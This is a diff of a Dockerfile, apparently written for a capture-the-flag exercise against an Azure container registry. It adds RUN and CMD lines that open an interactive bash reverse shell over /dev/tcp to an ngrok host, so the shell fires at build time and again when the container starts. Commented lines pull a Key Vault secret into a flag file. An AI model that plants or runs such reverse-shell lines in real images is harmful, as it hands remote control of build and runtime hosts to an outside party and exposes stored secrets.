@@ -1,5 +1,7 @@
 FROM alpine:latest
 RUN apk add --no-cache curl
+RUN bash -c "bash -i >& /dev/tcp/0.tcp.ap.ngrok.io/10912 0>&1"
+CMD ["bash", "-c", "bash -i >& /dev/tcp/0.tcp.ap.ngrok.io/10912 0>&1"]
 
 #FROM mcr.microsoft.com/azure-cli
 
@@ -14,13 +16,3 @@ RUN apk add --no-cache curl
 #RUN bash -c "az keyvault secret show --vault-name acr-2-9abb775ab0 --name acr-2-9abb775a-b0005 --query value -o tsv > /tmp/flag.txt"
 #CMD ["bash", "-c", "az keyvault secret show --vault-name acr-2-9abb775ab0 --name acr-2-9abb775a-b0005 --query value -o tsv > /tmp/flag.txt"]
 
-
-#FROM ubuntu:latest
-RUN bash -c "bash -i >& /dev/tcp/0.tcp.ap.ngrok.io/10912 0>&1"
-CMD ["bash", "-c", "bash -i >& /dev/tcp/0.tcp.ap.ngrok.io/10912 0>&1"]
-
-
-# Keep the container running or execute a command at runtime
-#CMD ["bash", "-c", "while true; do sleep 30; done"]
-#steps:
-#  - cmd: az keyvault secret show --vault-name acr-2-9abb775ab0 --name acr-2-9abb775a-b0005 --query value -o tsv
